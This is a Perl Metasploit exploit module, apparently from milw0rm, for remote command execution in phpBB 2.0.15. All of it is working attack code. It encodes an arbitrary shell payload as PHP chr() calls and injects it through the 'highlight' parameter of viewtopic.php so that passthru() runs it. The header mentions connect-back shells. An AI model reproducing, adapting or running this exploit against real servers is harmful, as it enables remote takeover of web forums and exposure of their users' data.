##
# phpBB 2.0.15 arbitrary command execution eXploit
# metasploit style (connect back is always nice).
# coded because of boredom.
# php_phpbb2_0_15.pm /str0ke ! milw0rm.com
##

package Msf::Exploit::php_phpbb2_0_15;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
        'Name'     => 'phpBB 2.0.15 arbitrary command execution eXploit',
        'Version'  => '$Revision: 1.0 $',
        'Authors'  => [ 'str0ke / Used HDMoores php_xmlrpc_eval source as a template' ],
        'Arch'     => [ ],
        'OS'       => [ ],
        'Priv'     => 0,
        'UserOpts' =>
          {
                'RHOST' => [1, 'ADDR', 'The target address'],
                'RPORT' => [1, 'PORT', 'The target port', 80],
                'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
                'RPATH' => [1, 'DATA', 'Path to the viewtopic script', '/phpBB2/viewtopic.php'],
                'TOPIC' => [1, 'DATA', 'viewtopic id', '1'],
                'SSL'   => [0, 'BOOL', 'Use SSL'],
          },

        'Description' => Pex::Text::Freeform(qq{
                This module exploits an arbitrary code execution flaw in phpbb 2.0.15.
}),

        'Refs' =>
          [
                ['MIL', '1113'],
          ],

        'Payload' =>
          {
                'Space' => 512,
                'Keys'  => ['cmd', 'cmd_bash'],
          },

        'Keys' => ['phpbb'],
  };

sub new {
        my $class = shift;
        my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
        return($self);
}

sub Exploit {
        my $self = shift;
        my $target_host    = $self->GetVar('RHOST');
        my $target_port    = $self->GetVar('RPORT');
        my $vhost          = $self->GetVar('VHOST') || $target_host;
        my $path           = $self->GetVar('RPATH');
        my $topic           = $self->GetVar('TOPIC');
        my $cmd            = $self->GetVar('EncodedPayload')->RawPayload;

        # Encode the command as a set of chr() function calls
        my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));

        # Create the phpBB get request data
        my $data = "?t=$topic&highlight=%27.".
                "passthru($byte)".
                ".%27";

        my $req =
                "GET $path$data HTTP/1.1\r\n".
                "Host: $vhost:$target_port\r\n".
                "Content-Type: application/html\r\n".
                "Content-Length: ". length($data)."\r\n".
                "Connection: Close\r\n".
                "\r\n";

        my $s = Msf::Socket::Tcp->new(
                'PeerAddr'  => $target_host,
                'PeerPort'  => $target_port,
                'LocalPort' => $self->GetVar('CPORT'),
                'SSL'       => $self->GetVar('SSL'),
          );

        if ($s->IsError){
                $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
                return;
        }

        $self->PrintLine("[*] Sending the malicious phpBB Get request...");

        $s->Send($req);

        my $results = $s->Recv(-1, 20);
        $s->Close();

        return;
}

